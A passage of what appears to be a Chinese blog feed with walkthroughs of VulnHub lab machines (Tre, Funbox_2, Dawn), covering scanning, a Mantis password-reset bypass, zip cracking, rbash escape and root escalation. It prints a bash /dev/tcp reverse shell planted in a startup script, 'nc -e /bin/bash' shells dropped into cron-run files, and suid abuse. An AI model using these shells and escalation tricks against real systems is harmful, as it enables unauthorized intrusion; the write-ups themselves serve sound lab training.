src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507191601.png" /></p>
<p>获得的shell其实是wine搭建的模拟Windows环境的shell，而靶机/root/.wine/dosdevices目录下</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507191756.png" /></p>
<p>Z 目录就连接到靶机的根目录。此时可以查看/root/proof.txt
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Z:\root&gt;<span class="built_in">type</span> proof.txt</span><br><span class="line">ccc34dede451108a8fe6f75d6ea7d2ae</span><br></pre></td></tr></table></figure></p>
<p>还有一个flag在/home/fox/local.txt <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Z:\root&gt;<span class="built_in">type</span> proof.txt</span><br><span class="line">ccc34dede451108a8fe6f75d6ea7d2ae</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>本题对于获得shell并不难，缓冲区溢出也不难，难就难在这是Windows环境下的缓冲区溢出。。。。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>SQL注入</tag>
        <tag>WINE</tag>
        <tag>缓冲区溢出</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>27 Vulnhub Tre Writeup</title>
    <url>/2022/05/08/27%20Vulnhub%20Tre%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度中等。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/tre-1,483/">Tre: 1 ~
VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<p>目标：</p>
<ul>
<li>获得root权限</li>
<li>拿到1个flag</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li><strong>进阶路径枚举</strong></li>
<li>exp代码改造</li>
<li>边界突破（3种方法）</li>
<li>权限提升</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1.
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 192.168.100.23</span><br><span class="line">sudo nmap -p22,80,8082 -A 192.168.100.23</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507224231.png" /></p>
<h2 id="访问http服务">2.2. 访问http服务</h2>
<p>经尝试，80端口和8082端口的内容是一样的，都很干净，源码也没有有用的信息。那么接下来进行路径扫描
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.100.23/</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507224429.png" /></p>
<p>首先打开了adminer.php，这看过去像是数据库管理后台，但是我们现在还未获得任何和数据库有关的信息，所以先放着。我也尝试搜索了以下adminer的漏洞，但靶机所使用的版本比较新，并没有可以利用的漏洞。</p>
<p>接下来看了一下system目录，从401可以看出需要进行认证，但好在存在弱口令，admin:admin
即可绕过。</p>
<p>进入之后，这还是一个登录界面，这里就没有弱口令了。接下来对system这个路径接着扫描：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.100.23/system --header=<span class="string">&quot;Authorization&quot;</span>:<span class="string">&quot;Basic Authorization: Basic YWRtaW46YWRtaW4=&quot;</span></span><br></pre></td></tr></table></figure></p>
<p>请求头的信息可以从抓包看到</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507225055.png" /></p>
<p>将其base64解码就是 admin:admin</p>
<p>这回扫出了很多东西，尤其看到config的时候，直接访问该目录，有一个文档文件，重要内容如下：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># --- Database Configuration ---</span><br><span class="line">$g_hostname      = &#x27;localhost&#x27;;</span><br><span class="line">$g_db_username   = &#x27;mantissuser&#x27;;</span><br><span class="line">$g_db_password   = &#x27;password@123AS&#x27;;</span><br><span class="line">$g_database_name = &#x27;mantis&#x27;;</span><br><span class="line">$g_db_type       = &#x27;mysqli&#x27;;</span><br></pre></td></tr></table></figure></p>
<p>这是数据库的相关信息。</p>
<p>其实使用下面的命令，不用添加认证信息都可以扫出来config
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.100.23/ /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure></p>
<h2 id="get-shell">2.3. get shell</h2>
<h3 id="方法1">2.3.1. 方法1</h3>
<p>搜索 mantis 的漏洞</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507225817.png" /></p>
<p>由于不知道其版本号，因此采用最新的。从最后的RCE开始。需要加exp稍作修改（端口可以不用改）这里最好有mousepad进行修改，如果使用vim，会导致缩进有问题</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508074652.png" /></p>
<p>该漏洞可以直接反弹shell。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508074725.png" /></p>
<p>执行虽然报错了，但是已经反弹会shell了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508074746.png" /></p>
<h3 id="方法2">2.3.2. 方法2</h3>
<p>利用 mantis 的 Password Reset
漏洞。简单来说就是在mantis的verify.php界面如果带上
<code>?id=1&amp;confirm_hash=</code>，就可以不用登录直接跳到administrator修改用户信息的界面
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.100.23/system/verify.php?id=1&amp;confirm_hash=</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507233355.png" /></p>
<p>修改完密码直接登录即可，注意用户名是administrator，不是XiBejMub，这个是realname。</p>
<p>然后从Manage Users中看到了如下消息</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507233530.png" /></p>
<p>接下来直接ssh登录即可，具体可以看[[#2 3 3 方法3]]</p>
<h3 id="方法3">2.3.3. 方法3</h3>
<p>利用得到的数据库信息登录最开始的adminer。查看用户信息</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507230751.png" /></p>
<p>（最后一个用户是测试功能的时候注册的）</p>
<p>红色方框不像是一个realname，猜测可能是密码，直接使用ssh连接</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507230928.png" /></p>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>在查看sudo
-l的时候发现可以不用密码执行shutdown，也就是关机的命令。接下来找可以的文件，其实也可以找进程：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -perm -o=w -user root -ls 2&gt;/dev/null|grep -v proc|grep -v /sys/fs/cgroup</span><br><span class="line"></span><br><span class="line">ps -aux|grep root <span class="comment"># 这也可以</span></span><br></pre></td></tr></table></figure></p>
<p>找到一个可疑的文件 /usr/bin/check-system，文件内容如下：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DATE=`date &#x27;+%Y-%m-%d %H:%M:%S&#x27;`</span><br><span class="line">echo &quot;Service started at $&#123;DATE&#125;&quot; | systemd-cat -p info</span><br><span class="line"></span><br><span class="line">while :</span><br><span class="line">do</span><br><span class="line">echo &quot;Checking...&quot;;</span><br><span class="line">sleep 1;</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<p>那么这个进程是什么时候被执行的呢？ <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -Ri <span class="string">&quot;check-system&quot;</span> /etc 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507231843.png" /></p>
<p>从中可以看到操作系统启动的时候就会执行check-system，配合刚刚sudo
-l发现的shutdown指令，思路就很清晰了。</p>
<p>首先往里面编写反弹shell的指令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">DATE=`date <span class="string">&#x27;+%Y-%m-%d %H:%M:%S&#x27;</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Service started at <span class="variable">$&#123;DATE&#125;</span>&quot;</span> | systemd-cat -p info</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Checking...&quot;</span>;</span><br><span class="line">sleep 1;</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.100.10/5555 0&gt;&amp;1;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p>
<p>一定要加入到循环内，否则可能会没有效果。在循环内可以每1秒执行一次，能够保证反弹shell。</p>
<p>接着，kali监听5555端口 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp 5555</span><br></pre></td></tr></table></figure></p>
<p>最后，执行重启 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /sbin/shutdown -r now <span class="comment"># -r: 重启 now: 立刻</span></span><br></pre></td></tr></table></figure></p>
<p>等待一段时间之后</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507232533.png" /></p>
<p>接下来就可以读取flag了。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/root/root.txt</span><br><span class="line">&#123;SunCSR_Tr3_Viet_Nam_2020&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="番外">3. 番外</h1>
<p>权限提升的时候，利用方式可以很多样。比如还可以往循环内写入：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +s /usr/bin/vi</span><br></pre></td></tr></table></figure></p>
<p>然后重启。再次利用ssh登录，此时vi就获得了suid，而vi属主一般都是root，因此，就可以利用vi去修改/etc/passwd，不论是修改root密码，还是新建用户，按道理都是可以的，不过我尝试之后失败了。不过有人成功了。（疑问：添加了一个用户或者将root的密码那里去掉，亦或者修改root的密码都不行，不知道为什么）</p>
<ul>
<li><a
href="https://www.hackingarticles.in/tre1-vulnhub-walkthrough/">Tre:1
Vulnhub Walkthrough - Hacking Articles</a></li>
</ul>
<p>还可以给find加上suid</p>
<ul>
<li><a href="https://www.hacknos.com/tre-vulnhub-walkthrough/">Tre
Vulnhub Walkthrough - HackNos tre: 1 walkthrough</a></li>
</ul>
<h1 id="总结">4. 总结</h1>
<p>该靶机get shell方式比较多，还用到了带头部的路径扫描。</p>
<p>在权限提升的时候，利用对可疑程序/进程的修改，从而提权。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>漏洞搜索</tag>
        <tag>exp修改</tag>
        <tag>可疑进程提权</tag>
      </tags>
  </entry>
  <entry>
    <title>28 Vulnhub Funbox_2 Writeup</title>
    <url>/2022/05/08/28%20Vulnhub%20Funbox_2%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度较简单。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/funbox-rookie,520/">Funbox:
Rookie ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>低</li>
</ul>
<p>目标：</p>
<ul>
<li>获得root权限</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li>FTP服务漏洞</li>
<li>密码爆破</li>
<li>ssh公钥认证</li>
<li><strong>rbahs逃逸</strong></li>
<li>权限提升</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1.
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.32</span><br><span class="line">sudo nmap -p21,22,80 -A 10.0.2.32</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508084033.png" /></p>
<h2 id="http服务">2.2. http服务</h2>
<p>根据扫描的结果，靶机的80端口上存在着robots.txt，里面泄露了一个目录/logs/，但是靶机并没有该目录。</p>
<p>路径扫描也没有任何有用的信息。看来突破点应该在ftp上。</p>
<h2 id="get-shell">2.3. get shell</h2>
<p>ftp服务的版本是proftp 1.3.5e，搜索是否存在exploit <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit proftp 1.3.5</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508105057.png" /></p>
<p>虽然显示3个，但是其实针对的都是同一个漏洞。经测试，都无法成功，可能是因为靶机是1.3.5e，还是与1.3.5有所差别。</p>
<p>frp服务可以匿名登录，从扫描结果来看，存在着许多zip文件，将所有内容全部下载到kali，然后尝试解压。
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. ftp 10.0.2.32 21</span><br><span class="line">2. username: anonymous, password: 直接enter</span><br><span class="line">3. mget *  <span class="comment"># 下载所有文件</span></span><br><span class="line">4. get .@users  <span class="comment"># 下载隐藏文件</span></span><br><span class="line">5. get .@admins <span class="comment"># 下载隐藏文件</span></span><br></pre></td></tr></table></figure></p>
<p>首先查看welcome.msg, .@users, .@admins <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(m1ku㉿kali)-[~/funbox2]</span><br><span class="line">└─$ cat welcome.msg                                                                                                                                               82 ⨯</span><br><span class="line">Welcome, archive user %U@%R !</span><br><span class="line"></span><br><span class="line">The <span class="built_in">local</span> time is: %T</span><br><span class="line"></span><br><span class="line">This is an experimental FTP server.  If you have any unusual problems,</span><br><span class="line">please report them via e-mail to &lt;root@%L&gt;.</span><br><span class="line"></span><br><span class="line">┌──(m1ku㉿kali)-[~/funbox2]</span><br><span class="line">└─$ cat .@users                                                                                                                                                    1 ⨯</span><br><span class="line">Hi Users,</span><br><span class="line"></span><br><span class="line">be carefull with your keys. Find them <span class="keyword">in</span> %yourname%.zip.</span><br><span class="line">The passwords are the old ones.</span><br><span class="line"></span><br><span class="line">Regards</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">┌──(m1ku㉿kali)-[~/funbox2]</span><br><span class="line">└─$ cat .@admins        </span><br><span class="line">SGkgQWRtaW5zLAoKYmUgY2FyZWZ1bGwgd2l0aCB5b3VyIGtleXMuIEZpbmQgdGhlbSBpbiAleW91cm5hbWUlLnppcC4KVGhlIHBhc3N3b3JkcyBhcmUgdGhlIG9sZCBvbmVzLgoKUmVnYXJkcwpyb290</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(m1ku㉿kali)-[~/funbox2]</span><br><span class="line">└─$ <span class="built_in">echo</span> -n <span class="string">&quot;SGkgQWRtaW5zLAoKYmUgY2FyZWZ1bGwgd2l0aCB5b3VyIGtleXMuIEZpbmQgdGhlbSBpbiAleW91cm5hbWUlLnppcC4KVGhlIHBhc3N3b3JkcyBhcmUgdGhlIG9sZCBvbmVzLgoKUmVnYXJkcwpyb290&quot;</span>|base64 -d</span><br><span class="line">Hi Admins,</span><br><span class="line"></span><br><span class="line">be carefull with your keys. Find them <span class="keyword">in</span> %yourname%.zip.</span><br><span class="line">The passwords are the old ones.</span><br><span class="line"></span><br><span class="line">Regards</span><br><span class="line">root</span><br></pre></td></tr></table></figure></p>
<p>从这些信息中得知，这些压缩文件里面存放的是对应用户/root的登录key，并且这些压缩文件的加密密码都比较老</p>
<p>尝试解压，可以发现里面的内容是id_rda，也就是可以ssh公钥认证登录
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(m1ku㉿kali)-[~/funbox2]</span><br><span class="line">└─$ unzip anna.zip              </span><br><span class="line">Archive:  anna.zip</span><br><span class="line">[anna.zip] id_rsa password: </span><br></pre></td></tr></table></figure></p>
<p>接下来使用john进行暴力破解： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zip2john anna.zip &gt; anna</span><br><span class="line">john anna --wordlist=../rockyou.txt</span><br></pre></td></tr></table></figure></p>
<p>在对所有的压缩文件进行破解后，只有两个可以被破解 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cathrine.zip -&gt; catwoman</span><br><span class="line">tom.zip      -&gt; iubire</span><br></pre></td></tr></table></figure></p>
<p>两个解压得到的id_rda内容是一样的，接下来尝试用cathrine和tom进行ssh登录，发现只有tom能够登录
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh tom@10.0.2.32 -i id_rsa</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508103627.png" /></p>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>登录tom之后进行信息收集，在/home/tom中的.mysql_history中发现了疑似tom的密码的字段
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_HiStOrY_V2_</span><br><span class="line">show\040databases;</span><br><span class="line">quit</span><br><span class="line">create\040database\040&#x27;support&#x27;;</span><br><span class="line">create\040database\040support;</span><br><span class="line">use\040support</span><br><span class="line">create\040table\040users;</span><br><span class="line">show\040tables</span><br><span class="line">;</span><br><span class="line">select\040*\040from\040support</span><br><span class="line">;</span><br><span class="line">show\040tables;</span><br><span class="line">select\040*\040from\040support;</span><br><span class="line">insert\040into\040support\040(tom,\040xx11yy22!);</span><br><span class="line">quit</span><br></pre></td></tr></table></figure></p>
<p>其中<code>\040</code>应该是空格，xx11yy22! 怀疑是tom的密码。</p>
<p>尝试sudo -l，输入上述字符串，成功执行，果然是密码</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508103920.png" /></p>
<p>并且tom可以使用sudo执行所有命令，直接切换成root <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo su 或者 su root</span><br></pre></td></tr></table></figure></p>
<p>直接读取flag <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@funbox2:~<span class="comment"># cat flag.txt</span></span><br><span class="line">   ____  __  __   _  __   ___   ____    _  __             ___ </span><br><span class="line">  / __/ / / / /  / |/ /  / _ ) / __ \  | |/_/            |_  |</span><br><span class="line"> / _/  / /_/ /  /    /  / _  |/ /_/ / _&gt;  &lt;             / __/ </span><br><span class="line">/_/    \____/  /_/|_/  /____/ \____/ /_/|_|       __   /____/ </span><br><span class="line">           ____ ___  ___  / /_ ___  ___/ /       / /          </span><br><span class="line"> _  _  _  / __// _ \/ _ \/ __// -_)/ _  /       /_/           </span><br><span class="line">(_)(_)(_)/_/   \___/\___/\__/ \__/ \_,_/       (_)            </span><br><span class="line">                                                              </span><br><span class="line">from @0815R2d2 with ♥</span><br></pre></td></tr></table></figure></p>
<h3 id="rbash逃逸">2.4.1. rbash逃逸</h3>
<p>参考文章：<a
href="https://cloud.tencent.com/developer/article/1680551">RBash -
受限的Bash绕过 - 云+社区 - 腾讯云</a></p>
<p>其实我在使用LinEnum.sh进行信息收集的时候出现了错误，当我执行该文件的时候
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tom@funbox2:~$ ./LinEnum.sh </span><br><span class="line">-rbash: ./LinEnum.sh: restricted: cannot specify `/<span class="string">&#x27; in command names</span></span><br></pre></td></tr></table></figure></p>
<p>注意前面的rbash，我去搜索了一下，发现这是受限制的bash，无法执行一些命令。因此根据参考文章绕过，直接使用vi绕过。
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508104504.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508104518.png" /></p>
<p>然后就成功绕过了。</p>
<p>这里介绍另一种参考文章没介绍的，利用mysql。</p>
<p>首先使用sudo权限登录mysql，然后利用mysql执行系统命令，生成一个新的shell进程
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tom@funbox2:~$ sudo mysql -u tom -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 4</span><br><span class="line">Server version: 5.7.30-0ubuntu0.18.04.1 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; system bash</span><br><span class="line">root@funbox2:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p>
<p>这样子不仅绕过了rbash，还顺便提权了，哈哈哈哈哈哈哈。</p>
<h3 id="番外">2.4.2. 番外</h3>
<p>提权还可以使用对Ubuntu专用漏洞——CVE-2021-3493，测试可行。</p>
<h1 id="总结">3. 总结</h1>
<p>该靶机难度较简单，但还是学到了新的知识点：rbash逃逸。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>rbash逃逸</tag>
        <tag>zip密码爆破</tag>
      </tags>
  </entry>
  <entry>
    <title>29 Vulnhub Dawn Writeup</title>
    <url>/2022/05/08/29%20Vulnhub%20Dawn%20Writeup%20%E2%AD%90/</url>
    <content><![CDATA[<p>该靶机难度中等。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/sunset-dawn,341/">sunset:
dawn ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<p>目标：</p>
<ul>
<li>获得root权限</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li>Samba漏洞</li>
<li>任意文件上传</li>
<li>日志信息泄露</li>
<li>调度任务</li>
<li>密码爆破</li>
<li>权限提升</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1.
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.33</span><br><span class="line">sudo nmap -p80,139,445,3306 -A 10.0.2.33</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508112008.png" /></p>
<p>其中samba支持guest登录，也就是不需要密码就能够登录成功。</p>
<h2 id="samba服务">2.2. samba服务</h2>
<p>首先查看samba共享的文件夹有哪些： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L 10.0.2.33</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508135425.png" /></p>
<p>其中 print$ 是打印机，IPC$
是进程间通信的。只有第二个，还给了一个提示。因此，直接尝试连接该文件夹
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient \\\\10.0.2.33\\ITDEPT  <span class="comment"># 需要转义</span></span><br></pre></td></tr></table></figure></p>
<p>经过测试，发现文件夹下虽然没有文件，但是我们可以上传文件，还可以创建文件夹等。</p>
<h2 id="http服务">2.3. http服务</h2>
<p>访问主页面，发现页面好像还在搭建中，并没有任何有用的信息。接下来进行路径扫描
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.33</span><br></pre></td></tr></table></figure></p>
<p>发现了一个类似日志的可疑目录
/logs/，直接访问它，有4个文件，但是只有management.log能够下载，其他都没有权限。</p>
<p>查看这个日志</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508135920.png" /></p>
<p>发现这个日志好像是通过pspy64工具，将结果重定向到日志里，仔细观察日志，可以发现跟ITDEPT有关的文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508140032.png" /></p>
<p>可以看到/ITDEPT目录下的两个文件，product-control和web-control一直被执行。我们可以过一段时间再去下载这个日志，就能明显的看到。</p>
<h2 id="get-shell">2.4. get shell</h2>
<p>我们通过samba向ITDEPT目录传入与这两个文件同名的文件，这样子这个文件就会被执行，即可反弹shell。</p>
<p>这回用一个正向连接的命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nc -e /bin/bash -lvp 1234&quot;</span> &gt; web-control</span><br><span class="line">连接samba，然后</span><br><span class="line">put web-control</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508140449.png" /></p>
<p>过一两分钟后，这个文件被执行，靶机上将会监听1234端口，然后我们连接靶机：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 10.0.2.33 1234</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508140555.png" /></p>
<p>当然也可以用之前的反弹shell的命令。</p>
<p>这里最好使用product-control文件，因为这个文件是由uid=1000的用户执行的，web-control文件由uid=33执行的，前者为dawn，后者为www-data。如果使用后者，则还需要提权到普通用户。</p>
<h2 id="权限提升">2.5. 权限提升</h2>
<p>本题目有许多权限提升的方法。</p>
<h3 id="sudo-mysql">2.5.1. sudo + mysql</h3>
<p>查看/home/dawn/.bash_history的内容（重要内容如下） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;$1$$bOKpT2ijO.XcGlpjgAup9/&quot;  # $_$_$ 第1，2个$之间为加密算法，2，3个之间为salt，这是Linux上保存的密码的形式</span><br><span class="line">sudo /usr/bin/mysql -u root  -p</span><br><span class="line">sudo -l </span><br><span class="line">zsh</span><br><span class="line">....</span><br></pre></td></tr></table></figure></p>
<p>首先 sudo -l</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508141407.png" /></p>
<p>可以sudo登录mysql，但是需要密码，将得到的hash值用john破解，得到:onii-chan29</p>
<p>使用该密码登录MySQL</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508141949.png" /></p>
<p>输入 <code>\! sh</code> 提权为root</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508143725.png" /></p>
<p>最后读取flag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat  /root/flag.txt</span><br><span class="line">Hello! whitecr0wz here. I would like to congratulate and thank you for finishing the ctf, however, there is another way of getting a shell(very similar though). Also, 4 other methods are available for rooting this box!</span><br><span class="line"></span><br><span class="line">flag&#123;3a3e52f0a6af0d6e36d7c1ced3a9fd59&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="suid">2.5.2. suid</h3>
<p>利用下面命令查找suid文件 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508143907.png" /></p>
<p>zsh也是一个shell，属主为root，且具有suid权限，直接执行下面命令即可提权：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zsh</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508144009.png" /></p>
<h3 id="密码">2.5.3. 密码</h3>
<p>提权到root之后查看：</p>
<p>在/home/ganimedes/.bash_history里面找到了root的密码：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su</span><br><span class="line">thisisareallysecurepasswordnooneisgoingtoeverfind</span><br></pre></td></tr></table></figure></p>
<p>猜测应该可以先提权到ganimedes，然后再利用切换到root</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508144158.png" /></p>
<h3 id="crontab">2.5.4. crontab</h3>
<p>也是一样的，提权到root之后查看/var/www/html/logs</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508144308.png" /></p>
<p>可以看到不断反复的执行/home/ganimedes/phobos，并且还是以root执行的。但是在对应目录下并不存在该文件。</p>
<p>因此，可以创建一个对应文件： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nc -e /bin/bash -lvp 6666&quot;</span> &gt; /home/ganimedes/phobos</span><br></pre></td></tr></table></figure></p>
<p>接着在kali上监听对应端口，也需要等待一会。</p>
<h1 id="总结">3. 总结</h1>
<p>该靶机把常见的多个提权的方法都涉及了：</p>
<ol type="1">
<li>sudo</li>
<li>mysql</li>
<li>suid</li>
<li>命令文件泄露</li>
<li>crontab</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>sudo提权</tag>
        <tag>samba漏洞</tag>
        <tag>mysql提权</tag>
        <tag>crontab提权</tag>
        <tag>suid提权</tag>
      </tags>
  </entry>
  <entry>
